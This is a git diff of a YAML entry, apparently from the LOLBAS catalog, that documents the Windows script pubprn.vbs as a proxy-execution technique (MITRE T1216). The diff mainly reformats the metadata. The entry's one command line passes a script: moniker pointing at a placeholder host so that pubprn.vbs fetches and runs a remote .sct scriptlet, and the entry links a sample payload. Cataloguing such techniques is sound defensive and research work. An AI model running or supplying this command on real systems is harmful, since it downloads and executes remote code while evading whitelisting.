@@ -1,20 +1,29 @@
 ---
 Name: Pubprn.vbs
-Description: Execute
-Author: ''
+Description:
+Author: 'Oddvar Moe'
 Created: '2018-05-25'
-Categories: []
 Commands:
   - Command: pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct
-    Description: Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection.
+    Description: Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection
+    Usecase: Proxy execution
+    Category: Execute
+    Privileges: User
+    MitreID: T1216
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1216
+    OperatingSystem: Windows 10
 Full Path:
-  - C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
-  - C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs
-Code Sample:
-  - https://github.com/api0cradle/LOLBAS/blob/master/OSScripts/Payload/Pubprn_calc.sct
-Detection: []
+  - Path: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
+  - Path: C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs
+Code Sample: 
+  - Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Pubprn_calc.sct
+Detection:
+  - IOC:
 Resources:
-  - https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/
-  - https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
-  - https://github.com/enigma0x3/windows-operating-system-archaeology
-Notes: Thanks to Matt Nelson - @enigma0x3
+  - Link: https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/
+  - Link: https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
+  - Link: https://github.com/enigma0x3/windows-operating-system-archaeology
+Acknowledgement:
+  - Person: Matt Nelson
+    Handle: '@enigma0x3'
+---
